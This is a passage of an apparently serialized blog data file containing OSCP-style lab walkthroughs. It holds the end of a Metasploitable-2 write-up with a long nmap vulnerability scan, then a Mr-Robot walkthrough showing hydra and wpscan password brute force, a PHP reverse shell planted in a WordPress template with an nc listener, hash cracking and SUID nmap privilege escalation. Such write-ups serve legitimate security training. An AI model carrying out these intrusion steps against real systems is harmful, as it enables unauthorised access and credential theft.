__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307951578.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nRemember add implement privilege to what you upload\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307968824.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307977375.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTry to escalate privilege by CVE-2018-14665\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307983061.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFailed,What a pity.\nUse the method in previous hub.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307989107.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nremove the suffix name of the public key,then it’s the private key.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308017931.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method4cve-2012-1823\&quot;&gt;Method4:CVE-2012-1823&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method4cve-2012-1823\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308052350.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675308066038.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNeed privilege escalaion again&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;┌──(kali㉿kali)-[~]\n└─$ nmap —script vuln 192.168.124.32 -p-&lt;br&gt;\nStarting Nmap 7.92 ( &lt;a href=\&quot;https://nmap.org\&quot;&gt;https://nmap.org&lt;/a&gt; ) at 2022-11-03 21:54 EDT\nNmap scan report for bogon (192.168.124.32)\nHost is up (0.0020s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n| ftp-vsftpd-backdoor:\n|   VULNERABLE:\n|   vsFTPd version 2.3.4 backdoor\n|     State: VULNERABLE (Exploitable)\n|     IDs:  BID:48539  CVE:CVE-2011-2523\n|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.\n|     Disclosure date: 2011-07-03\n|     Exploit results:\n|       Shell command: id\n|       Results: uid=0(root) gid=0(root)\n|     References:\n|       &lt;a href=\&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\&quot;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb&lt;/a&gt;\n|       &lt;a href=\&quot;http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\&quot;&gt;http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523&lt;/a&gt;\n|_      &lt;a href=\&quot;https://www.securityfocus.com/bid/48539\&quot;&gt;https://www.securityfocus.com/bid/48539&lt;/a&gt;\n22/tcp    open  ssh\n23/tcp    open  telnet\n25/tcp    open  smtp\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|_      &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|&lt;em&gt;sslv2-drown: ERROR: Script execution failed (use -d to debug)\n| smtp-vuln-cve2010-4344:\n|&lt;/em&gt;  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params:\n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|       &lt;a href=\&quot;https://www.ietf.org/rfc/rfc2246.txt\&quot;&gt;https://www.ietf.org/rfc/rfc2246.txt&lt;/a&gt;\n|&lt;br&gt;\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/74733\&quot;&gt;https://www.securityfocus.com/bid/74733&lt;/a&gt;\n|       &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n|&lt;br&gt;\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n53/tcp    open  domain\n80/tcp    open  http\n| http-enum:\n|   /tikiwiki/: Tikiwiki\n|   /test/: Test page\n|   /phpinfo.php: Possible information file\n|   /phpMyAdmin/: phpMyAdmin\n|   /doc/: Potentially interesting directory w/ listing on ‘apache/2.2.8 (ubuntu) dav/2’\n|   /icons/: Potentially interesting folder w/ directory listing\n|_  /index/: Potentially interesting folder\n|&lt;em&gt;http-csrf: Couldn’t find any CSRF vulnerabilities.\n|&lt;em&gt;http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|&lt;em&gt;http-phpself-xss: ERROR: Script execution failed (use -d to debug)\n|&lt;em&gt;http-trace: TRACE is enabled\n|&lt;em&gt;http-dombased-xss: Couldn’t find any DOM based XSS.\n|&lt;em&gt;http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n512/tcp   open  exec\n513/tcp   open  login\n514/tcp   open  shell\n1099/tcp  open  rmiregistry\n| rmi-vuln-classloader:\n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n|&lt;br&gt;\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb\&quot;&gt;https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb&lt;/a&gt;\n1524/tcp  open  ingreslock\n2049/tcp  open  nfs\n2121/tcp  open  ccproxy-ftp\n3306/tcp  open  mysql\n|&lt;em&gt;ssl-ccs-injection: No reply from server (TIMEOUT)\n3632/tcp  open  distccd\n| distcc-cve2004-2687:\n|   VULNERABLE:\n|   distcc Daemon Command Execution\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2004-2687\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|       Allows executing of arbitrary commands on systems running distccd 3.1 and\n|       earlier. The vulnerability is the consequence of weak service configuration.\n|&lt;br&gt;\n|     Disclosure date: 2002-02-01\n|     Extra information:\n|&lt;br&gt;\n|     uid=1(daemon) gid=1(daemon) groups=1(daemon)\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687&lt;/a&gt;\n|       &lt;a href=\&quot;https://nvd.nist.gov/vuln/detail/CVE-2004-2687\&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2004-2687&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://distcc.github.io/security.html\&quot;&gt;https://distcc.github.io/security.html&lt;/a&gt;\n5432/tcp  open  postgresql\n| ssl-poodle:\n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n| ssl-dh-params:\n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|&lt;/em&gt;      &lt;a href=\&quot;https://weakdh.org\&quot;&gt;https://weakdh.org&lt;/a&gt;\n| ssl-ccs-injection:\n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the “CCS Injection” vulnerability.\n|&lt;br&gt;\n|     References:\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224&lt;/a&gt;\n|       &lt;a href=\&quot;http://www.openssl.org/news/secadv_20140605.txt\&quot;&gt;http://www.openssl.org/news/secadv_20140605.txt&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;http://www.cvedetails.com/cve/2014-0224\&quot;&gt;http://www.cvedetails.com/cve/2014-0224&lt;/a&gt;\n5900/tcp  open  vnc\n6000/tcp  open  X11\n6667/tcp  open  irc\n| irc-botnet-channels:\n|&lt;/em&gt;  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email &lt;a href=\&quot;mailto:admin@Metasploitable.LAN\&quot;&gt;admin@Metasploitable.LAN&lt;/a&gt; for more information.\n6697/tcp  open  ircs-u\n| irc-botnet-channels:\n|&lt;/em&gt;  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email &lt;a href=\&quot;mailto:admin@Metasploitable.LAN\&quot;&gt;admin@Metasploitable.LAN&lt;/a&gt; for more information.\n|&lt;em&gt;ssl-ccs-injection: No reply from server (TIMEOUT)\n8009/tcp  open  ajp13\n8180/tcp  open  unknown\n| http-slowloris-check:\n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server’s resources causing Denial Of Service.\n|&lt;br&gt;\n|     Disclosure date: 2009-09-17\n|     References:\n|       &lt;a href=\&quot;http://ha.ckers.org/slowloris/\&quot;&gt;http://ha.ckers.org/slowloris/&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750&lt;/a&gt;\n| http-enum:\n|   /admin/: Possible admin folder\n|   /admin/index.html: Possible admin folder\n|   /admin/login.html: Possible admin folder\n|   /admin/admin.html: Possible admin folder\n|   /admin/account.html: Possible admin folder\n|   /admin/admin_login.html: Possible admin folder\n|   /admin/home.html: Possible admin folder\n|   /admin/admin-login.html: Possible admin folder\n|   /admin/adminLogin.html: Possible admin folder\n|   /admin/controlpanel.html: Possible admin folder\n|   /admin/cp.html: Possible admin folder\n|   /admin/index.jsp: Possible admin folder\n|   /admin/login.jsp: Possible admin folder\n|   /admin/admin.jsp: Possible admin folder\n|   /admin/home.jsp: Possible admin folder\n|   /admin/controlpanel.jsp: Possible admin folder\n|   /admin/admin-login.jsp: Possible admin folder\n|   /admin/cp.jsp: Possible admin folder\n|   /admin/account.jsp: Possible admin folder\n|   /admin/admin_login.jsp: Possible admin folder\n|   /admin/adminLogin.jsp: Possible admin folder\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload\n|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload\n|   /admin/jscript/upload.html: Lizard Cart/Remote File upload\n|_  /webdav/: Potentially interesting folder\n8787/tcp  open  msgsrvr\n38316/tcp open  unknown\n44372/tcp open  unknown\n50889/tcp open  unknown\n55138/tcp open  unknown&lt;/p&gt;\n&lt;p&gt;Host script results:\n|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false&lt;/p&gt;\n&lt;p&gt;Nmap done: 1 IP address (1 host up) scanned in 322.11 seconds&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;mehod1cve-2007-2447&quot;],&quot;text&quot;:[0,&quot;Mehod1:CVE-2007-2447&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method2cve-2011-2523&quot;],&quot;text&quot;:[0,&quot;Method2:CVE-2011-2523&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method3cve-2004-2687&quot;],&quot;text&quot;:[0,&quot;Method3:CVE-2004-2687&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method4cve-2012-1823&quot;],&quot;text&quot;:[0,&quot;Method4:CVE-2012-1823&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-2&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/11&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/mr-robot&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -sV -O -Pn -T4 192.168.124.80 -p-\nnmap --script vuln 192.168.124.80 -p-\ndirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt\n```\nFound login page\n![](img/1675935901724.PNG)\nThe wordlist of fsocity.dic\n![](img/1675935906897.PNG)\n\nThe first key\n\n![](img/1675935911648.PNG)\n***\n# Method-1\n## Exploit wordpress\nsort and uniq\n```\nsort fsocity.dic | uniq &gt; fsocity-sort.dic\n```\nHydra enumerate users\n```\nhydra -t 64 -L fsocity-sort.dic -p test 192.168.124.4 http-form-post \&quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:Invalid username\&quot;\n```\n![](img/1675935995098.PNG)\n\nWpscan intrude users and password\n```\nwpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic\n```\n![](img/1675936001210.PNG)\n\n[Valid Combinations Found:\n Username: Elliot, Password: ER28-0652\nLogin in wordpress\n***\n## Getshell\nVisit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n![](img/1675936011245.png)\n\n\nlisten port 1234 on kali.\nThen  visit any pay which  not exists.\n`nc -lvnp 1234`\n![](img/1675936061435.PNG)\n\n\nFound another user robot and its file\n![](img/1675936067906.PNG)\n\nDecode password\nWrite &#39;c3fcd3d76192e4007dfb496cca67e13b&#39; into hash.txt\n```\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\n```\n![](img/1675936335560.PNG)\nTurn to user robot\n```\npython -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \nsu robot\n```\n![](img/1675936356620.PNG)\n\n\n***\n## Privilege escalation\nTry to escalate privilege through suid\nFind all the suid file.\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null\n```\n![](img/1675936394011.png)\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21\n```\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n![](img/1675936402754.PNG)\n`cat /root/key-3-of-3.txt`\n\n\n***\n# Enclosure\n\n![](img/1675935870791.PNG)\n\n![](img/1675935877529.png)\n\n![](img/1675935887078.PNG)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Mr-Robot.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;digest&quot;:[0,&quot;f948ce3104c70e88&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -sV -O -Pn -T4 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.80 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.80 /usr/share/wordlist/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;Found login page\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935901724.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nThe wordlist of fsocity.dic\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 